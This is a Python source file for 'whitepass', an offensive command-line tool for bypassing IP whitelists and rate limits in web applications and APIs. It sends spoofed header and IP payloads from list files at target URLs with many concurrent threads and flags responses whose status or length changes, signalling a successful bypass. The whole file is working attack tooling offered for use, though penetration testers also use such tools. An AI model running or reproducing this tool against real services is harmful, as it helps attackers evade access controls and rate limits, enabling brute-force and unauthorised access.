#!/usr/bin/env python3
from utils import *
import argparse
import sys
import os
import requests
import concurrent.futures
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed


banner = """

        ██╗    ██╗██╗  ██╗██╗████████╗███████╗██████╗  █████╗ ███████╗███████╗
        ██║    ██║██║  ██║██║╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██╔════╝██╔════╝
        ██║ █╗ ██║███████║██║   ██║   █████╗  ██████╔╝███████║███████╗███████╗
        ██║███╗██║██╔══██║██║   ██║   ██╔══╝  ██╔═══╝ ██╔══██║╚════██║╚════██║
        ╚███╔███╔╝██║  ██║██║   ██║   ███████╗██║     ██║  ██║███████║███████║
        ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝   ╚═╝   ╚══════╝╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝

        Bypass Whitelist/Ratelimit Implementations in Web Applications/APIs

        By : Hossam Mohamed (@wazehell) (Cyber Struggle Delta Group)

"""


KNOWN_PAYLOADS_PATH = "./db/known_payloads.txt"
KNOWN_HEADERS_PATH = "./db/headers.txt"
DEFAULT_THREADS = 50
ALL_PAYLOADS = None

def start_whitepass(url=None,method="get",data={},headers={}):
    request_headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'}
    request_headers.update(headers)
    request_data = {}
    request_data.update(data)
    request_func = None
    bad_http = [400,500,407,408,405,429]
    content_len = 0
    http_status = 200
    try:
        request_func = getattr(requests, method.lower())
    except Exception as e:
        print("[*] Method Not found !")
        exit()

    def do_request(payload={}):
        try:
            headers = request_headers.copy()
            headers.update(payload)
            req = request_func(url,headers=headers,data=data,timeout=120)
            reqc = req.headers.get('Content-Length',0)
            if not reqc == content_len and (not int(req.status_code) in bad_http):
                print(f"[+] Response with Diffrent Content-Length Using Header : {payload}")
            if not http_status == req.status_code and (not int(req.status_code) in bad_http):
                print(f"[+] Response with Diffrent HTTP-Status Using Header : {payload}")
            return req
        except Exception as e:
            pass

    #testing stage 
    try:
        req0 = request_func(url,headers=headers,data=data,timeout=120)
        req0c = req0.headers.get('Content-Length',0)
        data.update({'test':str('A'*50)})
        req1 = request_func(url,headers=headers,data=data,timeout=120)
        req1c = req1.headers.get('Content-Length',0)
        req2 = request_func(url,headers=headers,params=data,timeout=120)
        req2c = req2.headers.get('Content-Length',0)
        data.update({'test':str('A'*100)})
        req3 = request_func(url,headers=headers,params=data,timeout=120)
        req3c = req3.headers.get('Content-Length',0)

        if req0c == req1c == req2c:
            content_len = req0c
        else:
            if int(int(req2c) - int(req0c)) == 50:
                content_len = req0c
            else:
                #todo
                pass
        
        if req0.status_code == req2.status_code == req3.status_code:
            http_status = req0.status_code
        else:
            http_status = req0.status_code
            #todo
        
        if http_status == 429:
            http_status = 200

        print(f'[*] Content-Length Response {content_len}')
        print(f'[*] HTTP-Status Response {http_status}')
    except Exception as e:
        pass
    

    start = time.time()

    processes = []

    print(f"[*] Starting Test with {len(ALL_PAYLOADS)} Payload")
    with ThreadPoolExecutor(max_workers=DEFAULT_THREADS) as executor:
        for payload in ALL_PAYLOADS:
            processes.append(executor.submit(do_request, payload))



    print(f'[*] Testing Done : {time.time() - start}')



def whitepass(request_options=None,target_options=None,payload_options=None):

    global KNOWN_PAYLOADS_PATH,KNOWN_HEADERS_PATH,DEFAULT_THREADS
    global ALL_PAYLOADS
    parsed_request = None
    additionalrequest_headers = {}
    additionalrequest_data    = {}

    urllist             = target_options['urllist']
    url                 = target_options['url']
    requestFile         = target_options['requestFile']
    request_method      = request_options.get('method','get')
    request_headers     = request_options.get('headers',None)
    request_data        = request_options.get('data',None)
    known_ips           = payload_options['known_ips']
    additionalheaders   = payload_options['additionalheaders']
    additionalpayloads  = payload_options['additionalpayloads']
    threads             = payload_options.get('threads',DEFAULT_THREADS)
    if threads:
        DEFAULT_THREADS = int(threads)

    if request_headers:
        for reqheader in request_headers.split('\\n'):
            headerk = str(reqheader.split(':')[0]).replace(' ','')
            headerv = str(reqheader.split(':')[1]).replace(' ','')
            additionalrequest_headers[headerk] = headerv

    if request_data:
        additionalrequest_data = {x[0] : x[1] for x in [x.split("=") for x in request_data[1:].split("&") ]}



    payloads = prepre_payloads(known_ips=known_ips,known_payloads_path=KNOWN_PAYLOADS_PATH,
                                additionalpayloads=additionalpayloads)
    headers = prepre_headers(additionalheaders=additionalheaders,
                        known_headers_path=KNOWN_HEADERS_PATH)
    ALL_PAYLOADS = prepare_all(headers=headers,payloads=payloads)
    urls = []

    if url:
        if validate_url(url):
            urls.append(validate_url(url))
        else:
            print("bad url bro")
            exit()
    
    if urllist:
        if os.path.exists(urllist):
            for p in open(urllist,'r').readlines():
                p = p.replace('\n', '')
                v = validate_url(p)
                urls.append(p) if v and (not p in headers) else None
        else:
            print("list not exit exit")
            exit()

    if not urls and not requestFile:
        print("all targets are bad bro")
        exit()
    
    if requestFile:
        if os.path.exists(requestFile):
            data = parseRequestFile(requestFile)
            request_method = data.get('method',None)
            url = data.get('url',None)
            additionalrequest_data = data.get('data',dict())
            additionalrequest_headers = data.get('headers',dict())
            if url and request_method:
                if additionalrequest_data:
                    additionalrequest_data = {x[0] : x[1] for x in [x.split("=") for x in additionalrequest_data[1:].split("&") ]}
                else:
                    additionalrequest_data = dict()
            else:
                print("make sure that you got the file using 'save item' in burp")
                exit()
            start_whitepass(url=url,method=request_method,data=additionalrequest_data,headers=additionalrequest_headers)

    elif len(urls):
        for url in urls:
            start_whitepass(url=url,method=request_method,data=additionalrequest_data,headers=additionalrequest_headers)


def main():
    print(banner)
    parser = argparse.ArgumentParser(add_help=True)
    
    target = parser.add_argument_group("Target", "At least one of these options has to be provided to define the target(s)")
    target.add_argument("-u", "--url", dest="url",
            help="Target URL (e.g. \"http://www.site.com/api/login\")")
    target.add_argument("-l", dest="urllist",
        help="load target(s) from text file")
    target.add_argument("-r", dest="requestFile",
        help="Load HTTP request from a Burp request file or normal plain-text")

    request_option = parser.add_argument_group("Request", "These options can be used to specify how to connect to the target URL")
    request_option.add_argument("-m", dest="http_method",
        help="HTTP Method used to test ", default="GET")
    request_option.add_argument("--headers", dest="headers",
            help="Extra headers (e.g. \"Accept-Language: fr\\nETag: 123\")")
    request_option.add_argument("--data", dest="data",
            help="Data string to be sent through POST (e.g. \"id=1&name=wazehell\")")

    payload_option = parser.add_argument_group("Payloads", "These options can be used to specify payloads")
    payload_option.add_argument("-aH", "--headers-list", dest="additionalheaders",
        help="Load Extra header(s) keys from text file")
    payload_option.add_argument("-aP", "--payloads", dest="additionalpayloads",
        help="Load Extra payload(s) from text file")
    payload_option.add_argument("--ips", dest="known_ips",
        help="Known External/Internal IPs for the target comma separated (e.g. \"10.10.1.5,140.82.118.3\")")
    payload_option.add_argument("--threads", dest="threads", type=int,
        help="Max number of concurrent HTTP(s) requests (default %d)" % DEFAULT_THREADS)

    (args, _) = parser.parse_known_args(sys.argv)

    if not any((args.urllist, args.url, args.requestFile)):
        errMsg = "missing a mandatory option (-l or -u or -r). "
        errMsg += "Use -h for help\n"
        parser.error(errMsg)
    else:
        request_options= {
            'method':args.http_method,
            'headers':args.headers,
            'data':args.data,
        }
        target_options = {
            'urllist':args.urllist,
            'url':args.url,
            'requestFile':args.requestFile,
        }
        payload_options = {
            'additionalheaders':args.additionalheaders,
            'additionalpayloads':args.additionalpayloads,
            'known_ips':args.known_ips,
            'threads':args.threads,
        }
        whitepass(request_options=request_options,target_options=target_options,payload_options=payload_options)

if __name__ == "__main__":
    main()